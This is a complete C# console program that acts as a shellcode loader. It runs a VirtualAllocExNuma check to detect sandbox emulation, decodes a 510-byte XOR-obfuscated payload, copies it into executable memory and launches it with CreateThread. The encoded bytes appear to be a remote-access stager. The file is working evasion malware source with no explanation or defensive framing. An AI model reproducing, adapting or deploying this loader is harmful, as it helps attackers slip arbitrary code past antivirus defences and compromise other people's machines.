using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Xml.XPath;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            //Non-Emulated API
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

	    // Shellcode
byte[] buf = new byte[510] {0x7b, 0xcf, 0x04, 0x63, 0x77, 0x6f, 0x4b, 0x87, 0x87, 0x87, 0xc6, 0xd6, 0xc6, 0xd7, 0xd5, 0xcf, 0xb6, 0x55, 0xd6, 0xe2, 0xcf, 0x0c, 0xd5, 0xe7, 0xcf, 0x0c, 0xd5, 0x9f, 0xcf, 0x0c, 0xd5, 0xa7, 0xd1, 0xca, 0xb6, 0x4e, 0xcf, 0x0c, 0xf5, 0xd7, 0xcf, 0x88, 0x30, 0xcd, 0xcd, 0xcf, 0xb6, 0x47, 0x2b, 0xbb, 0xe6, 0xfb, 0x85, 0xab, 0xa7, 0xc6, 0x46, 0x4e, 0x8a, 0xc6, 0x86, 0x46, 0x65, 0x6a, 0xd5, 0xc6, 0xd6, 0xcf, 0x0c, 0xd5, 0xa7, 0x0c, 0xc5, 0xbb, 0xcf, 0x86, 0x57, 0xe1, 0x06, 0xff, 0x9f, 0x8c, 0x85, 0x88, 0x02, 0xf5, 0x87, 0x87, 0x87, 0x0c, 0x07, 0x0f, 0x87, 0x87, 0x87, 0xcf, 0x02, 0x47, 0xf3, 0xe0, 0xcf, 0x86, 0x57, 0xc3, 0x0c, 0xc7, 0xa7, 0x0c, 0xcf, 0x9f, 0xd7, 0xce, 0x86, 0x57, 0x64, 0xd1, 0xcf, 0x78, 0x4e, 0xc6, 0x0c, 0xb3, 0x0f, 0xcf, 0x86, 0x51, 0xca, 0xb6, 0x4e, 0xcf, 0xb6, 0x47, 0x2b, 0xc6, 0x46, 0x4e, 0x8a, 0xc6, 0x86, 0x46, 0xbf, 0x67, 0xf2, 0x76, 0xcb, 0x84, 0xcb, 0xa3, 0x8f, 0xc2, 0xbe, 0x56, 0xf2, 0x5f, 0xdf, 0xc3, 0x0c, 0xc7, 0xa3, 0xce, 0x86, 0x57, 0xe1, 0xc6, 0x0c, 0x8b, 0xcf, 0xc3, 0x0c, 0xc7, 0x9b, 0xce, 0x86, 0x57, 0xc6, 0x0c, 0x83, 0x0f, 0xc6, 0xdf, 0xc6, 0xdf, 0xcf, 0x86, 0x57, 0xd9, 0xde, 0xdd, 0xc6, 0xdf, 0xc6, 0xde, 0xc6, 0xdd, 0xcf, 0x04, 0x6b, 0xa7, 0xc6, 0xd5, 0x78, 0x67, 0xdf, 0xc6, 0xde, 0xdd, 0xcf, 0x0c, 0x95, 0x6e, 0xcc, 0x78, 0x78, 0x78, 0xda, 0xce, 0x39, 0xf0, 0xf4, 0xb5, 0xd8, 0xb4, 0xb5, 0x87, 0x87, 0xc6, 0xd1, 0xce, 0x0e, 0x61, 0xcf, 0x06, 0x6b, 0x27, 0x86, 0x87, 0x87, 0xce, 0x0e, 0x62, 0xce, 0x3b, 0x85, 0x87, 0x86, 0x3c, 0x47, 0x2f, 0xaa, 0x4c, 0xc6, 0xd3, 0xce, 0x0e, 0x63, 0xcb, 0x0e, 0x76, 0xc6, 0x3d, 0xcb, 0xf0, 0xa1, 0x80, 0x78, 0x52, 0xcb, 0x0e, 0x6d, 0xef, 0x86, 0x86, 0x87, 0x87, 0xde, 0xc6, 0x3d, 0xae, 0x07, 0xec, 0x87, 0x78, 0x52, 0xed, 0x8d, 0xc6, 0xd9, 0xd7, 0xd7, 0xca, 0xb6, 0x4e, 0xca, 0xb6, 0x47, 0xcf, 0x78, 0x47, 0xcf, 0x0e, 0x45, 0xcf, 0x78, 0x47, 0xcf, 0x0e, 0x46, 0xc6, 0x3d, 0x6d, 0x88, 0x58, 0x67, 0x78, 0x52, 0xcf, 0x0e, 0x40, 0xed, 0x97, 0xc6, 0xdf, 0xcb, 0x0e, 0x65, 0xcf, 0x0e, 0x7e, 0xc6, 0x3d, 0x1e, 0x22, 0xf3, 0xe6, 0x78, 0x52, 0x02, 0x47, 0xf3, 0x8d, 0xce, 0x78, 0x49, 0xf2, 0x62, 0x6f, 0x14, 0x87, 0x87, 0x87, 0xcf, 0x04, 0x6b, 0x97, 0xcf, 0x0e, 0x65, 0xca, 0xb6, 0x4e, 0xed, 0x83, 0xc6, 0xdf, 0xcf, 0x0e, 0x7e, 0xc6, 0x3d, 0x85, 0x5e, 0x4f, 0xd8, 0x78, 0x52, 0x04, 0x7f, 0x87, 0xf9, 0xd2, 0xcf, 0x04, 0x43, 0xa7, 0xd9, 0x0e, 0x71, 0xed, 0xc7, 0xc6, 0xde, 0xef, 0x87, 0x97, 0x87, 0x87, 0xc6, 0xdf, 0xcf, 0x0e, 0x75, 0xcf, 0xb6, 0x4e, 0xc6, 0x3d, 0xdf, 0x23, 0xd4, 0x62, 0x78, 0x52, 0xcf, 0x0e, 0x44, 0xce, 0x0e, 0x40, 0xca, 0xb6, 0x4e, 0xce, 0x0e, 0x77, 0xcf, 0x0e, 0x5d, 0xcf, 0x0e, 0x7e, 0xc6, 0x3d, 0x85, 0x5e, 0x4f, 0xd8, 0x78, 0x52, 0x04, 0x7f, 0x87, 0xfa, 0xaf, 0xdf, 0xc6, 0xd0, 0xde, 0xef, 0x87, 0xc7, 0x87, 0x87, 0xc6, 0xdf, 0xed, 0x87, 0xdd, 0xc6, 0x3d, 0x8c, 0xa8, 0x88, 0xb7, 0x78, 0x52, 0xd0, 0xde, 0xc6, 0x3d, 0xf2, 0xe9, 0xca, 0xe6, 0x78, 0x52, 0xce, 0x78, 0x49, 0x6e, 0xbb, 0x78, 0x78, 0x78, 0xcf, 0x86, 0x44, 0xcf, 0xae, 0x41, 0xcf, 0x02, 0x71, 0xf2, 0x33, 0xc6, 0x78, 0x60, 0xdf, 0xed, 0x87, 0xde, 0xce, 0x40, 0x45, 0x77, 0x32, 0x25, 0xd1, 0x78, 0x52};
	    // End Shellcode


            // Decoding 
// XOR decoding
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(buf[i] ^ 0x87);
}
	    // End Decoding

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
